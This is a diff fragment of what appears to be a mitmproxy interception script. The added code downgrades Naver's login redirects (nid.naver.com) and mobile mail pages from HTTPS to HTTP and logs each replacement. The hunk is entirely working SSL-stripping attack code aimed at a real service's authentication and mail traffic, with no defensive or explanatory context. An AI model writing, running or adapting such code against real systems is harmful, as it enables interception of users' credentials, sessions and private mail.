@@ -26,7 +26,18 @@ def request(context, flow):
         flow.request.host = "nid.naver.com"  # Transparent Proxy Patch
 
 def response(context, flow):
+    try:
+        loc = flow.response.headers['location']
+        if "nid.naver.com" in loc:
+            flow.response.headers['location'] = loc.replace('https', 'http')
+            context.log("***Replaced 30x Redirect***")
+    except KeyError:
+        pass
+
     if "naver" in flow.request.pretty_host:
+        if "m.mail.naver.com" in flow.request.pretty_host:
+            context.log("***Replaced JS Redirect***")
+            flow.response.content = flow.response.content.replace('https', 'http')
         if "m.naver.com" in flow.request.pretty_host and \
                 "m.naver.com/aside" in flow.request.pretty_url and \
                 "text/html" in flow.response.headers["content-type"]:
